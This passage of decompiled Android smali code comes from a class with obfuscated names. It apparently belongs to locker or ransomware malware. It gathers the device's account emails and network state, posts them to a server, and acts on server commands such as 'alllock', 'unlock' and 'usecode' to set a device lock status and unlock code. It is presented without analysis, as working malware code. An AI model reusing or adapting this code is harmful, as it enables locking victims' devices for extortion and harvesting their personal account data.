
    move-object/from16 v0, p0

    iget-object v0, v0, Lmzmr/iiyma/ssrxp/Pvyoevmw;->mContext:Landroid/content/Context;

    move-object/from16 v39, v0

    const-class v40, Lmzmr/iiyma/ssrxp/Jncsdpau;

    invoke-direct/range {v38 .. v40}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual/range {v37 .. v38}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 171
    .end local v16    # "editor":Landroid/content/SharedPreferences$Editor;
    .end local v31    # "settings":Landroid/content/SharedPreferences;
    :cond_3
    move-object/from16 v0, p0

    iget-object v0, v0, Lmzmr/iiyma/ssrxp/Pvyoevmw;->mContext:Landroid/content/Context;

    move-object/from16 v37, v0

    const-string v38, "cocon"

    const/16 v39, 0x0

    invoke-virtual/range {v37 .. v39}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v32

    .line 173
    .local v32, "settings2":Landroid/content/SharedPreferences;
    const-string v37, "status"

    const/16 v38, 0x0

    move-object/from16 v0, v32

    move-object/from16 v1, v37

    move/from16 v2, v38

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v35

    .line 174
    .local v35, "status2":I
    const/16 v37, 0x4d

    move/from16 v0, v35

    move/from16 v1, v37

    if-ne v0, v1, :cond_4

    .line 175
    invoke-static {}, Landroid/os/Process;->myPid()I

    move-result v37

    invoke-static/range {v37 .. v37}, Landroid/os/Process;->killProcess(I)V

    .line 177
    :cond_4
    const-string v37, "unlock"

    move-object/from16 v0, v30

    move-object/from16 v1, v37

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v37

    if-eqz v37, :cond_5

    .line 179
    move-object/from16 v0, p0

    iget-object v0, v0, Lmzmr/iiyma/ssrxp/Pvyoevmw;->mContext:Landroid/content/Context;

    move-object/from16 v37, v0

    const-string v38, "cocon"

    const/16 v39, 0x0

    invoke-virtual/range {v37 .. v39}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v31

    .line 180
    .restart local v31    # "settings":Landroid/content/SharedPreferences;
    invoke-interface/range {v31 .. v31}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v16

    .line 181
    .restart local v16    # "editor":Landroid/content/SharedPreferences$Editor;
    const-string v37, "status"

    const/16 v38, 0x4d

    move-object/from16 v0, v16

    move-object/from16 v1, v37

    move/from16 v2, v38

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 182
    invoke-interface/range {v16 .. v16}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 183
    new-instance v20, Landroid/content/Intent;

    move-object/from16 v0, p0

    iget-object v0, v0, Lmzmr/iiyma/ssrxp/Pvyoevmw;->mContext:Landroid/content/Context;

    move-object/from16 v37, v0

    const-class v38, Lmzmr/iiyma/ssrxp/Jncsdpau;

    move-object/from16 v0, v20

    move-object/from16 v1, v37

    move-object/from16 v2, v38

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 184
    .local v20, "ii":Landroid/content/Intent;
    const-string v37, "close"

    const-string v38, "allclose"

    move-object/from16 v0, v20

    move-object/from16 v1, v37

    move-object/from16 v2, v38

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 185
    move-object/from16 v0, p0

    iget-object v0, v0, Lmzmr/iiyma/ssrxp/Pvyoevmw;->mContext:Landroid/content/Context;

    move-object/from16 v37, v0

    move-object/from16 v0, v37

    move-object/from16 v1, v20

    invoke-virtual {v0, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 188
    .end local v16    # "editor":Landroid/content/SharedPreferences$Editor;
    .end local v20    # "ii":Landroid/content/Intent;
    .end local v31    # "settings":Landroid/content/SharedPreferences;
    :cond_5
    const-string v37, "incorrect"

    move-object/from16 v0, v30

    move-object/from16 v1, v37

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v37

    if-eqz v37, :cond_6

    .line 190
    move-object/from16 v0, p0

    iget-object v0, v0, Lmzmr/iiyma/ssrxp/Pvyoevmw;->mContext:Landroid/content/Context;

    move-object/from16 v37, v0

    const-string v38, "cocon"

    const/16 v39, 0x0

    invoke-virtual/range {v37 .. v39}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v31

    .line 191
    .restart local v31    # "settings":Landroid/content/SharedPreferences;
    invoke-interface/range {v31 .. v31}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v16

    .line 192
    .restart local v16    # "editor":Landroid/content/SharedPreferences$Editor;
    const-string v37, "status"

    const/16 v38, 0x3

    move-object/from16 v0, v16

    move-object/from16 v1, v37

    move/from16 v2, v38

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 193
    invoke-interface/range {v16 .. v16}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 194
    move-object/from16 v0, p0

    iget-object v0, v0, Lmzmr/iiyma/ssrxp/Pvyoevmw;->mContext:Landroid/content/Context;

    move-object/from16 v37, v0

    new-instance v38, Landroid/content/Intent;

    move-object/from16 v0, p0

    iget-object v0, v0, Lmzmr/iiyma/ssrxp/Pvyoevmw;->mContext:Landroid/content/Context;

    move-object/from16 v39, v0

    const-class v40, Lmzmr/iiyma/ssrxp/Jncsdpau;

    invoke-direct/range {v38 .. v40}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual/range {v37 .. v38}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 196
    .end local v16    # "editor":Landroid/content/SharedPreferences$Editor;
    .end local v31    # "settings":Landroid/content/SharedPreferences;
    :cond_6
    const-string v37, "usecode"

    move-object/from16 v0, v30

    move-object/from16 v1, v37

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v37

    if-eqz v37, :cond_7

    .line 198
    move-object/from16 v0, p0

    iget-object v0, v0, Lmzmr/iiyma/ssrxp/Pvyoevmw;->mContext:Landroid/content/Context;

    move-object/from16 v37, v0

    const-string v38, "cocon"

    const/16 v39, 0x0

    invoke-virtual/range {v37 .. v39}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v31

    .line 199
    .restart local v31    # "settings":Landroid/content/SharedPreferences;
    invoke-interface/range {v31 .. v31}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v16

    .line 200
    .restart local v16    # "editor":Landroid/content/SharedPreferences$Editor;
    const-string v37, "status"

    const/16 v38, 0x4

    move-object/from16 v0, v16

    move-object/from16 v1, v37

    move/from16 v2, v38

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 201
    invoke-interface/range {v16 .. v16}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 202
    move-object/from16 v0, p0

    iget-object v0, v0, Lmzmr/iiyma/ssrxp/Pvyoevmw;->mContext:Landroid/content/Context;

    move-object/from16 v37, v0

    new-instance v38, Landroid/content/Intent;

    move-object/from16 v0, p0

    iget-object v0, v0, Lmzmr/iiyma/ssrxp/Pvyoevmw;->mContext:Landroid/content/Context;

    move-object/from16 v39, v0

    const-class v40, Lmzmr/iiyma/ssrxp/Jncsdpau;

    invoke-direct/range {v38 .. v40}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual/range {v37 .. v38}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 204
    .end local v16    # "editor":Landroid/content/SharedPreferences$Editor;
    .end local v31    # "settings":Landroid/content/SharedPreferences;
    :cond_7
    const-string v37, "alllock"

    move-object/from16 v0, v30

    move-object/from16 v1, v37

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v37

    if-eqz v37, :cond_8

    .line 205
    const-string v37, "muuuu"

    const-string v38, "ooopppsss"

    invoke-static/range {v37 .. v38}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 208
    move-object/from16 v0, p0

    iget-object v0, v0, Lmzmr/iiyma/ssrxp/Pvyoevmw;->mContext:Landroid/content/Context;

    move-object/from16 v37, v0

    const-string v38, "cocon"

    const/16 v39, 0x0

    invoke-virtual/range {v37 .. v39}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v31

    .line 209
    .restart local v31    # "settings":Landroid/content/SharedPreferences;
    invoke-interface/range {v31 .. v31}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v16

    .line 210
    .restart local v16    # "editor":Landroid/content/SharedPreferences$Editor;
    const-string v37, "status"

    const/16 v38, 0x0

    move-object/from16 v0, v16

    move-object/from16 v1, v37

    move/from16 v2, v38

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 211
    const-string v37, "animation"

    const/16 v38, 0x0

    move-object/from16 v0, v16

    move-object/from16 v1, v37

    move/from16 v2, v38

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 212
    const-string v37, "pcode"

    const-string v38, ""

    move-object/from16 v0, v16

    move-object/from16 v1, v37

    move-object/from16 v2, v38

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 213
    invoke-interface/range {v16 .. v16}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 214
    move-object/from16 v0, p0

    iget-object v0, v0, Lmzmr/iiyma/ssrxp/Pvyoevmw;->mContext:Landroid/content/Context;

    move-object/from16 v37, v0

    new-instance v38, Landroid/content/Intent;

    move-object/from16 v0, p0

    iget-object v0, v0, Lmzmr/iiyma/ssrxp/Pvyoevmw;->mContext:Landroid/content/Context;

    move-object/from16 v39, v0

    const-class v40, Lmzmr/iiyma/ssrxp/Jncsdpau;

    invoke-direct/range {v38 .. v40}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual/range {v37 .. v38}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 221
    .end local v4    # "accounts":[Landroid/accounts/Account;
    .end local v5    # "activeNetwork":Landroid/net/NetworkInfo;
    .end local v7    # "base64":Ljava/lang/String;
    .end local v8    # "camera":I
    .end local v9    # "cm":Landroid/net/ConnectivityManager;
    .end local v10    # "code":Ljava/lang/String;
    .end local v11    # "data":Ljava/lang/String;
    .end local v12    # "data2":Ljava/lang/String;
    .end local v13    # "data3":[B
    .end local v16    # "editor":Landroid/content/SharedPreferences$Editor;
    .end local v17    # "email":Ljava/lang/String;
    .end local v18    # "emailPattern":Ljava/util/regex/Pattern;
    .end local v19    # "hc":Lorg/apache/http/impl/client/DefaultHttpClient;
    .end local v21    # "isMobile":Z
    .end local v22    # "isWifi":Z
    .end local v23    # "key":I
    .end local v24    # "mcrypt":Lmzmr/iiyma/ssrxp/Ydoqnsryb;
    .end local v25    # "nameValuePairs":Ljava/util/List;, "Ljava/util/List<Lorg/apache/http/NameValuePair;>;"
    .end local v28    # "postMethod":Lorg/apache/http/client/methods/HttpPost;
    .end local v29    # "res":Lorg/apache/http/client/ResponseHandler;, "Lorg/apache/http/client/ResponseHandler<Ljava/lang/String;>;"
    .end local v30    # "response":Ljava/lang/String;
    .end local v31    # "settings":Landroid/content/SharedPreferences;
    .end local v32    # "settings2":Landroid/content/SharedPreferences;
    .end local v33    # "settings3":Landroid/content/SharedPreferences;
    .end local v34    # "status":I
    .end local v35    # "status2":I
    .end local v36    # "typenet":Ljava/lang/String;
    :cond_8
    :goto_4
    const/16 v37, 0x0

    return-object v37

    .line 90
    .restart local v5    # "activeNetwork":Landroid/net/NetworkInfo;
    .restart local v9    # "cm":Landroid/net/ConnectivityManager;
    .restart local v19    # "hc":Lorg/apache/http/impl/client/DefaultHttpClient;
    .restart local v25    # "nameValuePairs":Ljava/util/List;, "Ljava/util/List<Lorg/apache/http/NameValuePair;>;"
    .restart local v28    # "postMethod":Lorg/apache/http/client/methods/HttpPost;
    .restart local v29    # "res":Lorg/apache/http/client/ResponseHandler;, "Lorg/apache/http/client/ResponseHandler<Ljava/lang/String;>;"
    .restart local v36    # "typenet":Ljava/lang/String;
    :cond_9
    const/16 v21, 0x0

    goto/16 :goto_0

    .line 102
    .restart local v4    # "accounts":[Landroid/accounts/Account;
    .restart local v17    # "email":Ljava/lang/String;
    .restart local v18    # "emailPattern":Ljava/util/regex/Pattern;
    .restart local v21    # "isMobile":Z
    .restart local v22    # "isWifi":Z
    :cond_a
    aget-object v3, v4, v37

    .line 103
    .local v3, "account":Landroid/accounts/Account;
    iget-object v0, v3, Landroid/accounts/Account;->name:Ljava/lang/String;

    move-object/from16 v39, v0

    move-object/from16 v0, v18

    move-object/from16 v1, v39

    invoke-virtual {v0, v1}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v39

    invoke-virtual/range {v39 .. v39}, Ljava/util/regex/Matcher;->matches()Z

    move-result v39

    if-eqz v39, :cond_b

    .line 104
    iget-object v0, v3, Landroid/accounts/Account;->name:Ljava/lang/String;

    move-object/from16 v27, v0

    .line 105
    .local v27, "possibleEmail":Ljava/lang/String;
    new-instance v39, Ljava/lang/StringBuilder;

    invoke-static/range {v17 .. v17}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v40

    invoke-direct/range {v39 .. v40}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v40, ", "

    invoke-virtual/range {v39 .. v40}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v39

    move-object/from16 v0, v39

    move-object/from16 v1, v27

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v39

    invoke-virtual/range {v39 .. v39}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v17

    .line 102
    .end local v27    # "possibleEmail":Ljava/lang/String;
    :cond_b
    add-int/lit8 v37, v37, 0x1

    goto/16 :goto_1

    .line 132
    .end local v3    # "account":Landroid/accounts/Account;
    .restart local v7    # "base64":Ljava/lang/String;
    .restart local v8    # "camera":I
    .restart local v10    # "code":Ljava/lang/String;
    .restart local v11    # "data":Ljava/lang/String;
    .restart local v12    # "data2":Ljava/lang/String;
    .restart local v13    # "data3":[B
    .restart local v24    # "mcrypt":Lmzmr/iiyma/ssrxp/Ydoqnsryb;
    .restart local v33    # "settings3":Landroid/content/SharedPreferences;
    .restart local v34    # "status":I
    :catch_0
    move-exception v15

    .line 133
    .local v15, "e1":Ljava/io/UnsupportedEncodingException;
    invoke-virtual {v15}, Ljava/io/UnsupportedEncodingException;->printStackTrace()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    goto/16 :goto_2

    .line 218
    .end local v4    # "accounts":[Landroid/accounts/Account;
    .end local v5    # "activeNetwork":Landroid/net/NetworkInfo;
    .end local v7    # "base64":Ljava/lang/String;
    .end local v8    # "camera":I
    .end local v9    # "cm":Landroid/net/ConnectivityManager;
    .end local v10    # "code":Ljava/lang/String;
    .end local v11    # "data":Ljava/lang/String;
    .end local v12    # "data2":Ljava/lang/String;
    .end local v13    # "data3":[B
    .end local v15    # "e1":Ljava/io/UnsupportedEncodingException;
    .end local v17    # "email":Ljava/lang/String;
    .end local v18    # "emailPattern":Ljava/util/regex/Pattern;
    .end local v19    # "hc":Lorg/apache/http/impl/client/DefaultHttpClient;
    .end local v21    # "isMobile":Z
    .end local v22    # "isWifi":Z
    .end local v24    # "mcrypt":Lmzmr/iiyma/ssrxp/Ydoqnsryb;
    .end local v25    # "nameValuePairs":Ljava/util/List;, "Ljava/util/List<Lorg/apache/http/NameValuePair;>;"
    .end local v28    # "postMethod":Lorg/apache/http/client/methods/HttpPost;
    .end local v29    # "res":Lorg/apache/http/client/ResponseHandler;, "Lorg/apache/http/client/ResponseHandler<Ljava/lang/String;>;"
    .end local v33    # "settings3":Landroid/content/SharedPreferences;
    .end local v34    # "status":I
    .end local v36    # "typenet":Ljava/lang/String;
    :catch_1
    move-exception v14

    .line 219
    .local v14, "e":Ljava/lang/Exception;
    sget-object v37, Ljava/lang/System;->out:Ljava/io/PrintStream;

    new-instance v38, Ljava/lang/StringBuilder;

    const-string v39, "Exp="

    invoke-direct/range {v38 .. v39}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v38

    invoke-virtual {v0, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v38

    invoke-virtual/range {v38 .. v38}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v38

    invoke-virtual/range {v37 .. v38}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    goto :goto_4

    .line 145
    .end local v14    # "e":Ljava/lang/Exception;
    .restart local v4    # "accounts":[Landroid/accounts/Account;
    .restart local v5    # "activeNetwork":Landroid/net/NetworkInfo;
    .restart local v7    # "base64":Ljava/lang/String;
    .restart local v8    # "camera":I
    .restart local v9    # "cm":Landroid/net/ConnectivityManager;
    .restart local v10    # "code":Ljava/lang/String;
    .restart local v11    # "data":Ljava/lang/String;
    .restart local v12    # "data2":Ljava/lang/String;
    .restart local v13    # "data3":[B
    .restart local v17    # "email":Ljava/lang/String;
    .restart local v18    # "emailPattern":Ljava/util/regex/Pattern;
    .restart local v19    # "hc":Lorg/apache/http/impl/client/DefaultHttpClient;
    .restart local v21    # "isMobile":Z
    .restart local v22    # "isWifi":Z
    .restart local v23    # "key":I
    .restart local v24    # "mcrypt":Lmzmr/iiyma/ssrxp/Ydoqnsryb;
    .restart local v25    # "nameValuePairs":Ljava/util/List;, "Ljava/util/List<Lorg/apache/http/NameValuePair;>;"
    .restart local v28    # "postMethod":Lorg/apache/http/client/methods/HttpPost;
    .restart local v29    # "res":Lorg/apache/http/client/ResponseHandler;, "Lorg/apache/http/client/ResponseHandler<Ljava/lang/String;>;"
    .restart local v33    # "settings3":Landroid/content/SharedPreferences;
    .restart local v34    # "status":I
    .restart local v36    # "typenet":Ljava/lang/String;
    :catch_2
    move-exception v26

    .line 146
    .local v26, "oops":Landroid/content/pm/PackageManager$NameNotFoundException;
    :try_start_5
    invoke-virtual/range {v26 .. v26}, Landroid/content/pm/PackageManager$NameNotFoundException;->printStackTrace()V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_1

    goto/16 :goto_3
.end method

.method public getDeviceName()Ljava/lang/String;
    .locals 4

    .prologue
    .line 50
    sget-object v0, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    .line 51
    .local v0, "manufacturer":Ljava/lang/String;
    sget-object v1, Landroid/os/Build;->MODEL:Ljava/lang/String;

    .line 52
    .local v1, "model":Ljava/lang/String;
    invoke-virtual {v1, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 53
    invoke-direct {p0, v1}, Lmzmr/iiyma/ssrxp/Pvyoevmw;->capitalize(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 55
    :goto_0
    return-object v2

    :cond_0
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {p0, v0}, Lmzmr/iiyma/ssrxp/Pvyoevmw;->capitalize(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, " "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    goto :goto_0
.end method
